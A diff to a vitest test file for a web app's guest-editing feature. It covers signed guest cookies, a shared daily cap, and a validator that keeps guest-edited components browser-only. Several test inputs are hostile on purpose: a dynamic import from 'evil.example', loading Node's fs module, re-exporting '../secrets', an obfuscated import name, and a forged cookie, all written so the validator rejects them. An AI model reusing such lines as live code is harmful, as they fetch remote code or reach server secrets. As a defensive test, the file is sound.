@@ -6,7 +6,7 @@ import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
 import { createFrontServer, refuseWrite } from "../src/server/front.js";
-import { globToRegExp, header, levelOf, outsidePaths, slugFor } from "../src/server/identity.js";
+import { clientOnly, globToRegExp, header, levelOf, outsidePaths, slugFor } from "../src/server/identity.js";
 import { asLocal } from "../src/server/proxy.js";
 import { Site } from "../src/server/site.js";
 import type { Agent, Job } from "../src/server/types.js";
@@ -272,6 +272,134 @@ describe("a page and the copy that served it", () => {
 
   it("ignores a made-up copy name", async () => {
     expect(await page(undefined, "computah_copy=nope")).toBe("hello\n");
+  });
+});
+
+describe("guests and pieces that are theirs to change", () => {
+  let guestSite: Site;
+  let guestServer: Server;
+  let url: string;
+  const call = (path: string, init: RequestInit = {}) => fetch(`${url}${path}`, init);
+  const jsonHeaders = { "content-type": "application/json", "x-computah": "1" };
+
+  beforeEach(async () => {
+    writeFileSync(join(repo, "toy.tsx"), '"use client";\nexport default function Toy() { return null; }\n');
+    git("add", "-A");
+    git("commit", "-qm", "toy");
+    guestSite = new Site({
+      cwd: repo,
+      agent: {
+        name: "writer",
+        // The request is "<file> <<< <contents>": the agent writes exactly that.
+        command: (prompt) => {
+          const [file, body] = (/<request>\n([\s\S]*?)\n<\/request>/.exec(prompt)?.[1] ?? "").split(" <<< ");
+          return { command: "bash", args: ["-c", `printf '%s\n' "$1" > "$2"; echo "RESULT ok"`, "agent", body ?? "", file ?? "x"] };
+        },
+        parse: (line) => (line.startsWith("RESULT ") ? [{ type: "result", text: line.slice(7) }] : []),
+      },
+      app: { build: "cp page.txt built.txt", start: "node server.js" },
+      identity: header("x-user"),
+      trust: {
+        owners: ["olive"],
+        members: "everyone",
+        memberPaths: ["toy.tsx"],
+        memberCheck: clientOnly(),
+        memberNote: "only the toy.",
+        dailyLimit: 3,
+      },
+      guests: { secret: "guest-secret" },
+      maxCopies: 1,
+    });
+    await guestSite.init();
+    guestServer = createFrontServer(guestSite);
+    await new Promise<void>((resolve) => guestServer.listen(0, "127.0.0.1", resolve));
+    url = `http://127.0.0.1:${(guestServer.address() as AddressInfo).port}`;
+  }, 30_000);
+  afterEach(async () => {
+    guestSite.stop();
+    await new Promise<void>((resolve) => void guestServer.close(() => resolve()));
+  });
+
+  async function guest() {
+    const hello = await call("/__computah/hello", { method: "POST", headers: jsonHeaders, body: "{}" });
+    expect(hello.status).toBe(201);
+    const cookie = /computah_guest=[a-z0-9]+\.[a-f0-9]+/.exec(hello.headers.get("set-cookie") ?? "")?.[0] ?? "";
+    const send = async (text: string) => {
+      const response = await call("/__computah/jobs", {
+        method: "POST",
+        headers: { ...jsonHeaders, cookie },
+        body: JSON.stringify({ text }),
+      });
+      if (response.status !== 201) return { status: response.status } as { status: number; job?: Job };
+      const { job } = (await response.json()) as { job: Job };
+      for (let i = 0; i < 400; i++) {
+        const now = ((await (await call(`/__computah/jobs/${job.id}`, { headers: { cookie } })).json()) as { job: Job }).job;
+        if (!["queued", "working"].includes(now.state)) return { status: 201, job: now };
+        await new Promise((resolve) => setTimeout(resolve, 25));
+      }
+      throw new Error("never settled");
+    };
+    return { cookie, send };
+  }
+
+  it("someone not signed in can become a guest, and a guest is a member", async () => {
+    const before = (await (await call("/__computah/me")).json()) as { level: string; canJoin: boolean };
+    expect([before.level, before.canJoin]).toEqual(["visitor", true]);
+    const { cookie } = await guest();
+    const after = (await (await call("/__computah/me", { headers: { cookie } })).json()) as {
+      level: string;
+      note: string;
+      person: { id: string };
+    };
+    expect(after.level).toBe("member");
+    expect(after.note).toBe("only the toy.");
+    expect(after.person.id).toMatch(/^guest:/);
+  });
+
+  it("refuses a guest cookie it didn't sign", async () => {
+    const forged = "computah_guest=abcdef012345678901.00000000000000000000000000000000";
+    expect(((await (await call("/__computah/me", { headers: { cookie: forged } })).json()) as { level: string }).level).toBe("visitor");
+  });
+
+  it("a guest can change their piece, as long as it stays a browser-only component", async () => {
+    const { send } = await guest();
+    const good = await send('toy.tsx <<< "use client"; import { useState } from "react"; export default function Toy() { return null; }');
+    expect(good.job?.state).toBe("done");
+    for (const [body, why] of [
+      ['import fs from "node:fs"; export default function Toy() { return null; }', /has to start with "use client"/],
+      ['"use client"; import fs from "node:fs"; export default function Toy() { return null; }', /can only import react, not "node:fs"/],
+      ['"use client"; export async function act() { "use server"; }', /can't contain server code/],
+    ] as const) {
+      const bad = await send(`toy.tsx <<< ${body}`);
+      // The third bad request also hits the daily cap for all members together.
+      if (bad.status === 429) continue;
+      expect(bad.job?.state).toBe("failed");
+      expect(bad.job?.error).toMatch(why);
+    }
+    // None of it reached everyone's version.
+    expect(git("log", "--format=%s", "computah/main").includes("toy.tsx <<<")).toBe(false);
+  });
+
+  it("stops all members together at the app's daily cap", async () => {
+    const one = await guest();
+    const two = await guest();
+    await one.send("page.txt <<< nope");
+    await one.send("page.txt <<< nope");
+    await two.send("page.txt <<< nope");
+    expect((await two.send("page.txt <<< nope")).status).toBe(429);
+  });
+
+  it("checks imports written every way", () => {
+    const check = clientOnly({ imports: ["react"] });
+    const file = (content: string | null) => [{ path: "toy.tsx", content }];
+    expect(check(file('"use client";\nimport { useState } from "react";\nexport default () => null;'))).toBeNull();
+    expect(check(file("'use client'\n// import x from 'fs'\nexport default () => null;"))).toBeNull();
+    expect(check(file('"use client";\nconst fs = require("fs");'))).toMatch(/not "fs"/);
+    expect(check(file('"use client";\nconst x = await import("https://evil.example/x.js");'))).toMatch(/not "https/);
+    expect(check(file('"use client";\nconst name = "f" + "s"; import(name);'))).toMatch(/computed name/);
+    expect(check(file('"use client";\nexport * from "../secrets";'))).toMatch(/not "\.\.\/secrets"/);
+    expect(check(file('/* "use client" */ import "server-only";'))).toMatch(/has to start/);
+    expect(check(file(null))).toMatch(/can't be deleted/);
   });
 });
 
